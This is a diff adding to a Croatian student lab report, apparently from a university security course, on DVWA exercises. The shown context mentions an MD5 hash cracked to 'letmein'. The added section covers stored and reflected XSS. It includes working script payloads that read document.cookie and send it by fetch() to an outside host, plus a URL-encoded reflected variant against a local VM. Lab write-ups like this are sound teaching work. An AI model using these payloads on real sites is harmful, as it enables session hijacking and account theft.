@@ -55,3 +55,29 @@ lozinke: „0d107d09f5bbe40cade3de5c71e9e9b7”.
 
 Konačno sam iz sažetka pomoću alata https://crackstation.net/ došao do
 korisnikove loznike, koja je „letmein”.
+
+
++------------------------------------------+
+| 3) XSS (Cross Site Scripting)            |
++------------------------------------------+
+
+Otvorio sam stranicu „XSS (Stored)”.  U polje poruke sam upisao
+„<script>alert(document.cookie)</script>”.  Time sam na ekranu dobio skočni
+prozor sa svojim kolačićima. Među njima je i traženi:
+PHPSESSID=82pfcbjf5ddrgujl9077suq614
+
+Korištenjem alata „Inpect” u pregledniku sam elementu <textarea> uklonio
+atribut „maxlength”, te sam si time omogućio slanje poruke dulje od 50
+znakova.  Za slanje kolačića kao parametra u GET zahtjevu sam koristio skriptu:
+
+<script>{
+  const params = new URLSearchParams();
+  params.set('cookie', document.cookie);
+  fetch('http://public.tel.fer.hr/srs?' + params.toString(), {mode: 'no-cors'});
+}</script>
+
+Za napade na stranici „XSS (Reflected)” sam koristio istovjetne skripte:
+
+http://192.168.56.101/vulnerabilities/xss_r/?name=<script>alert(document.cookie)<%2Fscript>
+
+http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3E%7B+const+params+%3D+new+URLSearchParams%28%29%3B+params.set%28%27cookie%27%2C+document.cookie%29%3B+fetch%28%27http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3F%27+%2B+params.toString%28%29%2C+%7Bmode%3A+%27no-cors%27%7D%29%3B+%7D%3C%2Fscript%3E
